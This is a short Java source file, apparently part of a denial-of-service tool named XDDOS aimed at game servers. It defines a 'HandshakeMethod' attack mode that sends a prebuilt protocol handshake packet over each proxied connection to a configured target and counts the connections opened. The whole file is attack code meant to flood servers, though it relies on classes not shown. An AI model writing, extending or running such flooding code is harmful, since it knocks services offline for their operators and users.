package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;



public class HandshakeMethod
  implements Method
{
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
  private byte[] bytes = this.handshake.getWrappedPacket();


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
